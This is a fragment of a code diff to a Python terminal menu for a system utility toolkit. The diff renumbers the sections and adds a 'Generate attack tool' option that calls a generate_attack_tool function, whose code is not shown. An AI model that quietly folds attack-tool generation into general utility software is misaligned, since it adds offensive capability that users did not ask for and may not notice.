+                "WiFi information",
+                "Speed test",
+                "DNS lookup"
+            ]),
+            ("Advanced Operations", [
+                "System resources",
+                "Monitor services",
+                "Manage startup programs",
+                "System restore",
+                "Advanced search",
+                "Process explorer",
+                "Analyze memory",
+                "Scan handles",
+                "Map DLLs",
+                "Analyze threads",
+                "Trace stacks",
+                "Generate attack tool",
+                "Batch image processing",
+                "Exit"
+            ])
         ]
 
-        menu_sections = [
-            ("File Management", file_options, 1),         
-            ("Organization", organize_options, 8),    
-            ("System Tools", system_options, 13),   
-            ("Security", security_options, 17),    
-            ("Networking Tools", networking_options, 23),  # Updated from 23
-            ("System Monitoring", system_monitoring_options, 29), # Updated from 29  
-            ("Advanced Tools", advanced_options, 31)  # Updated from 32
-        ]
-        
-        for title, options, start_num in menu_sections:
+        start_num = 1
+        for title, options in sections:
             display_menu_section(title, options, start_num)
-            print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")
+            print(f"{Fore.CYAN}╠═{'═' * (width-4)}═╣")  # Add section separator
+            start_num += len(options)
+
+        print(f"{Fore.CYAN}╚═{'═' * (width-4)}═╝")  # Add bottom border
         
-        print(f"{Fore.CYAN}║ {Fore.RED}Enter '40' to exit{' ' * (width-21)}{Fore.CYAN}║")
-        print(f"{Fore.CYAN}╚═{'═' * (width-4)}═╝")
-
         try:
-            choice = input(f"\n{Fore.GREEN}Enter your choice (1-40): {Fore.WHITE}")
-
-            if choice.lower() == '41':
-                display_exit_screen()
-                break
-                
-            clear_screen()
+            choice = input(f"\n{Fore.GREEN}Enter your choice (1-{start_num-1}): {Fore.WHITE}")
             
             if choice == '1':
                 change_directory()
@@ -3415,6 +3662,10 @@ def main_menu():
             elif choice == "39":
                 trace_stacks()
             elif choice == "40":
+                generate_attack_tool()
+            elif choice == "41":
+                batch_image_processing()
+            elif choice == "42":
                 display_exit_screen()
                 break
 
